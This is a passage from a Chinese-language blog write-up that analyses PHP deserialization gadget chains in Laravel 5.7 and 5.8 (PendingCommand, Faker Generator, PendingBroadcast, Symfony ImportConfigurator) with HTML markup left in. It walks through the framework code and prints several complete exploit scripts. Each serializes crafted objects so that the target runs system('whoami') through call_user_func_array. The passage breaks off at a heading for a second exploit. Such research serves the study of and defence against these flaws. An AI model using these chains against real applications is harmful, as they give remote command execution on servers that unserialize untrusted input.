class="title">mockConsoleOutput</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $mock = Mockery::mock(OutputStyle::class.<span class="string">'[askQuestion]'</span>, [</span><br><span class="line">        (<span class="keyword">new</span> ArrayInput(<span class="keyword">$this</span>-&gt;parameters)), <span class="keyword">$this</span>-&gt;createABufferedOutputMock(),</span><br><span class="line">    ]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;test-&gt;expectedQuestions <span class="keyword">as</span> $i =&gt; $question) &#123;</span><br><span class="line">        $mock-&gt;shouldReceive(<span class="string">'askQuestion'</span>)</span><br><span class="line">            -&gt;once()</span><br><span class="line">            -&gt;ordered()</span><br><span class="line">            -&gt;with(Mockery::on(<span class="function"><span class="keyword">function</span> <span class="params">($argument)</span> <span class="title">use</span> <span class="params">($question)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> $argument-&gt;getQuestion() == $question[<span class="number">0</span>];</span><br><span class="line">            &#125;))</span><br><span class="line">            -&gt;andReturnUsing(<span class="function"><span class="keyword">function</span> <span class="params">()</span> <span class="title">use</span> <span class="params">($question, $i)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;test-&gt;expectedQuestions[$i]);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> $question[<span class="number">1</span>];</span><br><span class="line">            &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;app-&gt;bind(OutputStyle::class, <span class="function"><span class="keyword">function</span> <span class="params">()</span> <span class="title">use</span> <span class="params">($mock)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $mock;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就有一个小细节。看到七月火师傅跟这里时选择打断点然后直接step over单步跳过。发现能正常执行到foreach。所以就没去看<code>$mock</code>那行的代码。这应该是为了减少不必要的审计代码量。(听说一路看下去的话又臭又长……)<br><img src="/2020/08/17/Laravel-popchain/1.PNG" alt></p><p>现在可以看向<code>$this-&gt;test-&gt;expectedQuestions</code>这句。其中expectedQuestions是个数组。从执行exp来看,我们属性中并没有<code>$this-&gt;test</code>对象.所以会触发<code>__get()</code><br>既然如此其实就是找<code>__get</code>方法返回值可控的类了。这里找到<br>src\Faker\DefaultGenerator.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($attribute)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;default;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以大致的一个脉络已经出来了。但是我们对某些变量还是不清楚。同时也不知道是否会有报错退出。因此可以用一个半成品poc来探测。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Testing</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingCommand</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">test</span>;</span><br><span class="line">        <span class="keyword">protected</span> $app;</span><br><span class="line">        <span class="keyword">protected</span> $command;</span><br><span class="line">        <span class="keyword">protected</span> $parameters;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($test, $app, $command, $parameters)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;test = $test;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;app = $app;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;command = $command;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parameters = $parameters;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">DefaultGenerator</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">default</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($default = null)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;default = $default;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Application</span>&#123;</span><br><span class="line">        <span class="title">public</span> <span class="title">function</span> <span class="title">__construct</span>() &#123; &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title">namespace</span>&#123;</span><br><span class="line">    $<span class="title">defaultgenerator</span> = <span class="title">new</span> <span class="title">Faker</span>\<span class="title">DefaultGenerator</span>(<span class="title">array</span>("1" =&gt; "1"));</span><br><span class="line">    $application = <span class="keyword">new</span> Illuminate\Foundation\Application();</span><br><span class="line">    $pendingcommand = <span class="keyword">new</span> Illuminate\Foundation\Testing\PendingCommand($defaultgenerator, $application, <span class="string">'system'</span>, <span class="keyword">array</span>(<span class="string">'id'</span>));</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($pendingcommand));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里PendingCommand类的四个参数是原构造函数中就有的。而为什么会在这里出现<code>Illuminate\Foundation\Application</code>要在后面解释。</p><p>我们还是直接打断点看它的执行。单步跳过的话会发现到<code>$this-&gt;app-&gt;bind</code>为止都是可以正常进行的。直到<code>$exitCode = $this-&gt;app[Kernel::class]-&gt;call($this-&gt;command, $this-&gt;parameters);</code>这个我们命令执行的最后一步才抛出错误。一路跟过去可以看到报错具体内容<br><img src="/2020/08/17/Laravel-popchain/2.PNG" alt></p><p>那么我们肯定得深入下这行代码。这里我们需要添加代码看<code>$this-&gt;app[Kernel::class]</code>.因为直接调用的话我们是没法看出Kernel::class的。所以比较好的方法还是单独拿出来看。<br><img src="/2020/08/17/Laravel-popchain/3.PNG" alt><br>可以看到。<code>$this-&gt;app</code>即我们之前exp中实例化的<code>Illuminate\Foundation\Application</code>类的对象.而<code>Kernel::class</code>会固定返回字符串<code>Illuminate\Contracts\Console\Kernel</code></p><p>接下来我们发现只要单步跳过<code>$app = $this-&gt;app[Kernel::class];</code>就会出错抛出跟之前调用反序列化时一样的错误。所以问题肯定出在这句代码上。那么一路跟进<br>会发现是调用了这么几个函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Pipeline</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">handleException</span><span class="params">($passable, Exception $e)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$handler = <span class="keyword">$this</span>-&gt;container-&gt;make(ExceptionHandler::class)</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"><span class="comment">//Application</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">make</span><span class="params">($abstract, array $parameters = [])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $abstract = <span class="keyword">$this</span>-&gt;getAlias($abstract);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;deferredServices[$abstract]) &amp;&amp; ! <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;instances[$abstract])) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;loadDeferredProvider($abstract);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">parent</span>::make($abstract, $parameters);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Container</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">make</span><span class="params">($abstract, array $parameters = [])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resolve($abstract, $parameters);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">resolve</span><span class="params">($abstract, $parameters = [])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $abstract = <span class="keyword">$this</span>-&gt;getAlias($abstract);</span><br><span class="line"></span><br><span class="line">    $needsContextualBuild = ! <span class="keyword">empty</span>($parameters) || ! is_null(</span><br><span class="line">        <span class="keyword">$this</span>-&gt;getContextualConcrete($abstract)</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;instances[$abstract]) &amp;&amp; ! $needsContextualBuild) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;instances[$abstract];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>这里一路跟过来会发现在Application类调用父类也就是Container类的make方法,进一步到达resolve方法时。有一处可控点<code>return $this-&gt;instances[$abstract];</code></p><p>还记得我们是跟进<code>$this-&gt;app[Kernel::class]</code>来到这个返回值的吗?实际上我们最开始寻找命令执行时。是以<code>$this-&gt;app[Kernel::class]=&gt;call(xxx)</code>尝试调用命令的。那么既然这里app对象可控了,我们就可以调用任意对象的call方法了。</p><p>这也就是为什么我们前面选择Application类的原因。它继承了Container类。所以调用的是Container的call方法。我们跟进看下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Container</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">call</span><span class="params">($callback, array $parameters = [], $defaultMethod = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> BoundMethod::call(<span class="keyword">$this</span>, $callback, $parameters, $defaultMethod);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//BoundMethod</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">call</span><span class="params">($container, $callback, array $parameters = [], $defaultMethod = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">static</span>::isCallableWithAtSign($callback) || $defaultMethod) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">static</span>::callClass($container, $callback, $parameters, $defaultMethod);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">static</span>::callBoundMethod($container, $callback, <span class="function"><span class="keyword">function</span> <span class="params">()</span> <span class="title">use</span> <span class="params">($container, $callback, $parameters)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> call_user_func_array(</span><br><span class="line">            $callback, <span class="keyword">static</span>::getMethodDependencies($container, $callback, $parameters)</span><br><span class="line">        );</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getMethodDependencies</span><span class="params">($container, $callback, array $parameters = [])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $dependencies = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">static</span>::getCallReflector($callback)-&gt;getParameters() <span class="keyword">as</span> $parameter) &#123;</span><br><span class="line">        <span class="keyword">static</span>::addDependencyForCallParameter($container, $parameter, $parameters, $dependencies);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> array_merge($dependencies, $parameters);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里发现实际调用的是BoundMethod的闭包函数。关于闭包函数在js中曾经听说过。闭包主要是使用:一个内部函数可以引用外部函数的参数和变量，参数和变量就不会被收回的机制。</p><p>这里<code>getMethodDependencies</code>返回两个数组的合并数据。然而其中<code>$dependencies</code>数组是个空的。那么返回的还是我们可控的数组。既然如此。调用<code>call_user_func_array()</code>的这句代码两个参数就都是可控的。可以命令执行了。</p><p>rce exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Testing</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingCommand</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">test</span>;</span><br><span class="line">        <span class="keyword">protected</span> $app;</span><br><span class="line">        <span class="keyword">protected</span> $command;</span><br><span class="line">        <span class="keyword">protected</span> $parameters;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($test, $app, $command, $parameters)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;test = $test;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;app = $app;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;command = $command;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parameters = $parameters;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">DefaultGenerator</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">default</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($default = null)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;default = $default;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Application</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">instances</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($instances = [])</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;instances[<span class="string">'Illuminate\Contracts\Console\Kernel'</span>] = $instances;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $<span class="title">defaultgenerator</span> = <span class="title">new</span> <span class="title">Faker</span>\<span class="title">DefaultGenerator</span>(<span class="title">array</span>("1" =&gt; "1"));</span><br><span class="line">    $app = <span class="keyword">new</span> Illuminate\Foundation\Application();</span><br><span class="line">    $application = <span class="keyword">new</span> Illuminate\Foundation\Application($app);</span><br><span class="line">    $pendingcommand = <span class="keyword">new</span> Illuminate\Foundation\Testing\PendingCommand($defaultgenerator, $application, <span class="string">'system'</span>, <span class="keyword">array</span>(<span class="string">'whoami'</span>));</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($pendingcommand));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里只需要增加Application类的内容。让它在程序找向<code>$this-&gt;instances[&#39;Illuminate\Contracts\Console\Kernel&#39;]</code>找向它自己。这样我们就能调用它的call方法执行<code>call_user_func_array(&#39;system&#39;,&#39;whoami&#39;)</code>了.</p><p>小结一下。5.7的pop链从exp看起来也就三个类的事。但是其中调试的功夫要求比起thinkphp要高出不少。其中非常重要的一点就是通过动态调试找到<code>Kernel::class</code>的真正字符串值。并一路找到可控点来进行命令执行。</p><h2 id="laravel5-8-unserialize"><a href="#laravel5-8-unserialize" class="headerlink" title="laravel5.8-unserialize"></a>laravel5.8-unserialize</h2><p>5.8其实之前做国赛题目时跟过一次了。不过印象不太深刻了。所以再来看一次。其中有一条链是靠symfony组件做的。就不跟了。(实验了下最新版本symfony组件没法用了)</p><p>我主要看七月火师傅介绍的一条链。来自p神小密圈。然后还有一条链是来自护网杯的非预期。跟第五空间一个性质。如果是按composer直接下载的话。两条链都可以用。<br>还是老方法我们直接增加反序列化路由跟控制器代码。</p><p>入手点是一个貌似在laravel很多链子中都通用的destruct</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;events-&gt;dispatch(<span class="keyword">$this</span>-&gt;event);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很明显这里就有两种思路<br>1.全局找存在dispatch的有用方法。<br>2.全局找<code>__call</code>方法</p><h3 id="popchain1"><a href="#popchain1" class="headerlink" title="popchain1"></a>popchain1</h3><p>对于我个人而言这里可以说是第一反应就想去找<code>__call</code>.因为很明显的双参数均可控.php中<code>__call</code>这种魔术方法本来就是设计出来用来动态调用的。所以肯定有类中使用<code>call_user_func</code>这样的方式进行命令执行。我们不难找到符合条件的Generator类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">format</span><span class="params">($formatter, $arguments = array<span class="params">()</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> call_user_func_array(<span class="keyword">$this</span>-&gt;getFormatter($formatter), $arguments);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($method, $attributes)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;format($method, $attributes);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFormatter</span><span class="params">($formatter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;formatters[$formatter])) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;formatters[$formatter];</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br></pre></td></tr></table></figure><p>全部可控。所以最终<code>call_user_func</code>直接命令执行。这个真的是太简单了。难怪第5空间会换了<code>__destruct</code>.</p><p>(之前因为第5空间打的太烂了没进线下就没仔细研究。结果仔细一看发现原来当时那个是5.7的版本啊……)<br>说起来护网杯那题destruct代码调用的是<code>$this-&gt;events-&gt;fire($this-&gt;event);</code>。貌似跟官方源码不一样？但这条链偏偏是个非预期。有点迷。</p><p>popchain1 exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingBroadcast</span></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="title">protected</span> $<span class="title">events</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> $event;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($events, $event)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;event = $event;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events = $events;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Generator</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">formatters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($format)</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters = $format;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $<span class="title">fs</span> = <span class="title">array</span>("<span class="title">dispatch</span>"=&gt;"<span class="title">system</span>");</span><br><span class="line">    $gen = <span class="keyword">new</span> Faker\Generator($fs);</span><br><span class="line">    $pb = <span class="keyword">new</span> Illuminate\Broadcasting\PendingBroadcast($gen,<span class="string">"whoami"</span>);</span><br><span class="line">    <span class="keyword">echo</span>(urlencode(serialize($pb)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="popchain2"><a href="#popchain2" class="headerlink" title="popchain2"></a>popchain2</h3><p>来自上面这条链子的变招。刚刚说了Symphony最新版本已经没法<br>用了。其主要原因是,禁止对TagAwareAdapter类反序列化。所以加了一个__wakeup。根本到不了destruct那</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> \BadMethodCallException(<span class="string">'Cannot unserialize '</span>.<span class="keyword">__CLASS__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;commit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/08/17/Laravel-popchain/4.PNG" alt></p><p>但是有Symfony的情况下还是可以用其他类。比如我们搜索<code>__destruct</code>找到很明显的双参数可控调用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ImportConfigurator</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Traits</span>\<span class="title">HostTrait</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Traits</span>\<span class="title">PrefixTrait</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Traits</span>\<span class="title">RouteTrait</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> $parent;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(RouteCollection $parent, RouteCollection $route)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;parent = $parent;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;route = $route;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;parent-&gt;addCollection(<span class="keyword">$this</span>-&gt;route);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>destruct是一样的可控参数调用函数。所以殊途同归。<br>与上面一样的的性质。exp把dispatch改为addCollection就行了。</p><p>exp2</p><figure class="highlight 